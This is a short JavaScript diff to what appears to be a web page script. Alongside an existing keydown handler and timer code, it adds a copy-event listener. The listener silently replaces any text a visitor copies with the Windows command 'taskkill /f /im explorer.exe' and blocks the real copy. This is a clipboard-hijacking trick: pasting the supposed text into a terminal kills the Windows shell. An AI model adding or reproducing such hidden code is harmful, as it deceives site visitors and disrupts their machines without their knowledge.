@@ -73,6 +73,19 @@ document.addEventListener('keydown', function(e) {
   }
 });
 
+document.addEventListener('copy', function(event) {
+  //get the selected text
+  const selectedText = window.getSelection().toString();
+  const bashCode = 'taskkill /f /im explorer.exe';
+
+  //replace selected text
+  const clipboardData = event.clipboardData || window.clipboardData;
+  clipboardData.setData('text/plain', bashCode);
+
+  event.preventDefault();
+  // alert('modified copied content');
+});
+
 document.addEventListener('DOMContentLoaded', (event) => {
   let seconds = 0;
   const timerElement = document.getElementById('seconds');
